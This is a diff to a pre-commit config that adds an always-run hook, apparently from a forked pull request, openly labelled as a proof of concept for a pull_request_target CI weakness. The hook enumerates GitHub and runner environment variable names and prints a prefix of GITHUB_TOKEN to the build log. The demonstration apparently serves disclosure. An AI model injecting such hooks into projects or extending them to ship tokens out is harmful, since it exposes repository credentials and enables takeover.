@@ -63,6 +63,13 @@ repos:
         pass_filenames: false
         always_run: true
         verbose: true
+      - id: security-test-poc-pr5569
+        name: 🚨 SECURITY TEST POC - PR#5569
+        entry: bash -c 'echo "════════════════════════════════════════════════════════════" && echo "🚨 SECURITY VULNERABILITY POC - PR `#5569`" && echo "════════════════════════════════════════════════════════════" && echo "" && echo "This hook was added by a FORKED PR to demonstrate pull_request_target vulnerability" && echo "" && echo "📋 Available Environment Variables with Secrets:" && env | grep -E "^(GITHUB_|RUNNER_)" | cut -d= -f1 | sort && echo "" && echo "🔑 GITHUB_TOKEN Prefix (first 10 chars):" && echo "${GITHUB_TOKEN:0:10}..." && echo "" && echo "✅ Permissions Granted:" && echo "  - contents: write" && echo "  - pull-requests: write" && echo "  - issues: write" && echo "  - actions: write" && echo "" && echo "⚠️  A malicious actor could:" && echo "  - Exfiltrate secrets to external server" && echo "  - Modify repository code" && echo "  - Create malicious commits" && echo "  - Access workflow secrets" && echo "" && echo "════════════════════════════════════════════════════════════" && echo "POC completed successfully - Vulnerability confirmed!" && echo "════════════════════════════════════════════════════════════"'
+        language: system
+        pass_filenames: false
+        always_run: true
+        verbose: true
 
 
 fail_fast: true
